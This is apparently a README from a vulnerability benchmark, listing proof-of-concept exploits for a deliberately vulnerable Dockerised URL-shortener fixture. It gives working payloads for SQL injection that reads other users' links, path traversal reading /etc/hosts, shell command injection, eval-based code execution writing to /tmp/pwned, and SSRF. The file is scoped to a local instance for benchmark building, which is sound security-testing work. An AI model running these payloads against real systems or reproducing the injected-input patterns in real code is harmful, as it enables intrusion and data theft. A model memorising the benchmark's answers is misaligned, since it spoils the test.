# App Project Pygmy VulnBench 2.0 POCs

Run these commands only against a local instance started from
`fixtures/app-project-pygmy/project`. Start the stack from the repository root:

```sh
cd fixtures/app-project-pygmy/project
docker-compose up -d --build
```

The Django UI is at
`http://localhost:8000`; the Flask REST API (`pygmy`) is internal-only, reachable from other
containers on the compose network as `http://pygmy:9119`. All payloads were verified live
against a running instance of this exact fixture on 2026-08-18.

Register a user via `POST /signup` (Django form, needs a CSRF token — see below) and log in via
`POST /login` to get `access_token`/`refresh_token` cookies. **The access token expires after
60 seconds** (`JWT_ACCESS_TOKEN_EXPIRES = timedelta(minutes=1)` in `pygmy/rest/manage.py`) — log
in and use the token in the same script, not as separate steps.

```sh
# fetch a CSRF token, then sign up
CSRF=$(curl -sS http://localhost:8000/ -c cookies.txt -o /dev/null; grep csrftoken cookies.txt | awk '{print $NF}')
curl -sS -b cookies.txt -X POST http://localhost:8000/signup \
  -H "Referer: http://localhost:8000/" \
  --data-urlencode "f_name=Poc" --data-urlencode "l_name=User" \
  --data-urlencode "email=pocuser@example.com" --data-urlencode "password=pocpassword1" \
  --data-urlencode "confirm_password=pocpassword1" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF"

# log in immediately before each authenticated PoC to get a fresh token
CSRF=$(curl -sS http://localhost:8000/ -c cookies.txt -o /dev/null; grep csrftoken cookies.txt | awk '{print $NF}')
LOGIN=$(curl -sS -i -b cookies.txt -X POST http://localhost:8000/login \
  -H "Referer: http://localhost:8000/" \
  --data-urlencode "email=pocuser@example.com" --data-urlencode "password=pocpassword1" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF")
TOKEN=$(echo "$LOGIN" | grep -i "^set-cookie: access_token=" | sed -E 's/.*access_token=([^;]+);.*/\1/')
```

The `/api/user/links/*` and `/api/clicks/lookup` endpoints below are only reachable on the
internal `pygmy:9119` host, so exec into the `pygmyui` container to reach them (or `docker
exec` a one-off `python3 -c` snippet, as done here) — the header is `JWT_Authorization: Bearer
<token>`, not the standard `Authorization` (see `pygmy/rest/manage.py`).

## SQL injection — search my links

`GET /api/user/links/search?q=` concatenates the term directly into a raw SQL `LIKE` clause.
The injection below also breaks out of the owner filter, exposing other users' links:

```sh
docker exec -e TOKEN="$TOKEN" project-pygmyui-1 python3 -c "
import os, requests
headers = {'JWT_Authorization': 'Bearer ' + os.environ['TOKEN']}
base = 'http://pygmy:9119'
print(requests.get(base + '/api/user/links/search', headers=headers, params={'q': 'zzzzznomatch'}).text)          # control: []
print(requests.get(base + '/api/user/links/search', headers=headers, params={'q': \"x') OR (1=1) -- \"}).text)     # returns every user's links
"
```

## Path traversal — export my links

`GET /api/user/links/export?filename=` joins a request-controlled filename onto the user's
export directory with no containment check. Call `GET /api/user/links` first so a real export
file exists:

```sh
docker exec -e TOKEN="$TOKEN" project-pygmyui-1 python3 -c "
import os, requests
headers = {'JWT_Authorization': 'Bearer ' + os.environ['TOKEN']}
base = 'http://pygmy:9119'
requests.get(base + '/api/user/links', headers=headers)
print(requests.get(base + '/api/user/links/export', headers=headers, params={'filename': 'links.csv'}).text)  # control
print(requests.get(base + '/api/user/links/export', headers=headers, params={'filename': '../../../../../../etc/hosts'}).text)
"
```

## Command injection — click host lookup

`GET /api/clicks/lookup?host=` embeds the `host` parameter directly in a `host` shell command
with `shell=True`:

```sh
docker exec -e TOKEN="$TOKEN" project-pygmyui-1 python3 -c "
import os, requests
headers = {'JWT_Authorization': 'Bearer ' + os.environ['TOKEN']}
r = requests.get('http://pygmy:9119/api/clicks/lookup', headers=headers,
                 params={'host': '127.0.0.1; id; echo x'})
print(r.text)
"
```

## Code injection — filter my links

`GET /api/user/links/filter?expression=` evaluates the expression with `eval()`, passing only a
local-variable context dict that does not restrict access to builtins:

```sh
docker exec -e TOKEN="$TOKEN" project-pygmyui-1 python3 -c "
import os, requests
headers = {'JWT_Authorization': 'Bearer ' + os.environ['TOKEN']}
base = 'http://pygmy:9119'
print(requests.get(base + '/api/user/links/filter', headers=headers, params={'expression': \"long_url == 'nonexistent'\"}).text)  # control
print(requests.get(base + '/api/user/links/filter', headers=headers,
                   params={'expression': '__import__(\"os\").system(\"id > /tmp/pwned 2>&1\") == 0'}).text)
# then: docker exec project-pygmy-1 cat /tmp/pwned
"
```

## SSRF — verify long URL is reachable before shortening

`POST /shorten` (and the underlying `pygmy/rest/shorturl.py::LongUrlApi.post`) makes a
server-side request to confirm a submitted URL resolves before shortening it, with no allowlist
on the target host:

```sh
# start a local marker server first: python3 -m http.server 9002
curl -i -b cookies.txt -X POST http://localhost:8000/shorten \
  -H "Referer: http://localhost:8000/" \
  --data-urlencode "long_url=http://host.docker.internal:9002/marker" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF"
# the marker server's own access log shows the hit (even a 404 is proof the
# request reached it) — proving the server, not the client, made the request.
# host.docker.internal is Docker Desktop's host-loopback name.
```

## Regression check and cleanup

```sh
docker exec -w /pygmy project-pygmy-1 python3 -m pytest tests/ -v

cd fixtures/app-project-pygmy/project
docker-compose down -v
rm -rf data/exports pygmy/data/pygmy.db
```
